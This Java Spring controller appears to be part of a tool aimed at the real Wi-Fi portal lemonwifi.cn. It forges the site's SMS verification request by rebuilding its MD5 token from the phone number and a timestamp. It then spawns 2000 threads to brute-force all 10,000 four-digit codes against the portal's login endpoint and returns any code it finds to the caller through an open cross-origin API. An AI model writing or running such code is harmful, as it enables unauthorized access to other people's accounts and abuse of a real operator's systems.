package cn.xiaohai.xlemonwifi.controller;

import cn.xiaohai.xlemonwifi.entity.LemonWifiRequest;
import cn.xiaohai.xlemonwifi.entity.Result;
import cn.xiaohai.xlemonwifi.utility.LemonWifiPasswordCracker;
import org.springframework.web.bind.annotation.CrossOrigin;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RestController;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicReference;

@CrossOrigin(origins = "*")
@RestController
public class LemonWifiController {

    @PostMapping("/lemonwifi")
    public Result lemonwifi(@RequestBody LemonWifiRequest request) {

        String username = request.getPhone();

        System.out.println("手机号: " + username);

        if (request.isYanz()) {
            //发送给验证码  https://lemonwifi.cn/portal/verification.ajax
            //POST请求方式
            //请求头
            //user-agent Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0
            //请求体
//            {
//                "mobile": "18888888888",
//                    "timestamp": "202504120222",
//                    "token": "a8d906397b806e6396e6635ab5a00077"
//            }

            try {
                String url = "http://lemonwifi.cn:80/portal/verification.ajax";
                URL obj = new URL(url);
                HttpURLConnection con = (HttpURLConnection) obj.openConnection();


                con.setRequestMethod("POST");


                con.setRequestProperty("Content-Type", "application/json");
                con.setRequestProperty("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0");


                DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyyMMddHHmm");




                String timestamp = LocalDateTime.now().format(formatter);


                String raw = username + "::000000" + timestamp;
                String token = md5(raw);
                String jsonBody = String.format(
                        "{\"mobile\":\"%s\",\"timestamp\":\"%s\",\"token\":\"%s\"}",
                        username, timestamp,token
                );

                System.out.println(jsonBody);

                con.setDoOutput(true);
                try (OutputStream os = con.getOutputStream()) {
                    byte[] input = jsonBody.getBytes("utf-8");
                    os.write(input, 0, input.length);
                }

                int responseCode = con.getResponseCode();
                if (responseCode == HttpURLConnection.HTTP_OK) {

//                    try (BufferedReader br = new BufferedReader(new InputStreamReader(con.getInputStream(), "utf-8"))) {
//                        StringBuilder response = new StringBuilder();
//                        String line;
//                        while ((line = br.readLine()) != null) {
//                            response.append(line.trim());
//                        }
//                        System.out.println("服务器响应: " + response);
//                    }


                } else {
                    System.err.println("响应码: " + responseCode);
                    System.out.println("手机号: " + username + " 验证码发送失败");
                    return Result.error("验证码发送失败（响应码错误）");

                }

            } catch (Exception e) {
                e.printStackTrace();
                System.out.println("手机号: " + username + " 验证码发送失败有异常");
                return Result.error("验证码发送失败（异常）");
            }




        }

        String url = "http://lemonwifi.cn:80/portal/login";
        int threadCount = 2000;
        ExecutorService executor = Executors.newFixedThreadPool(threadCount);
        int rangePerThread = 10000 / threadCount;
        AtomicBoolean stopFlag = new AtomicBoolean(false);
        AtomicReference<String> foundPassword = new AtomicReference<>(null);

        // 为每个线程分配开始和结束的范围
        for (int i = 0; i < threadCount; i++) {
            int start = i * rangePerThread;
            int end = (i == threadCount - 1) ? 9999 : (start + rangePerThread - 1);

            executor.execute(new LemonWifiPasswordCracker(url, username, start, end, foundPassword, stopFlag));
        }

        executor.shutdown();
        try {
            while (!executor.isTerminated()) {
                if (stopFlag.get()) {
                    executor.shutdownNow();
                    break;
                }
                Thread.sleep(100);
            }
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }

        if (foundPassword.get() != null) {
            return Result.success(foundPassword.get());
        } else {
            System.out.println("手机号: " + username + " 未找到密码");
            return Result.error("未找到密码");
        }
    }


    public static String md5(String input) {
        try {
            MessageDigest md = MessageDigest.getInstance("MD5");
            byte[] messageDigest = md.digest(input.getBytes());

            // 转换成 16 进制字符串
            StringBuilder hexString = new StringBuilder();
            for (byte b : messageDigest) {
                String hex = Integer.toHexString(0xff & b);
                if (hex.length() == 1)
                    hexString.append('0');
                hexString.append(hex);
            }

            return hexString.toString();

        } catch (NoSuchAlgorithmException e) {
            throw new RuntimeException("MD5算法不可用", e);
        }
    }

}
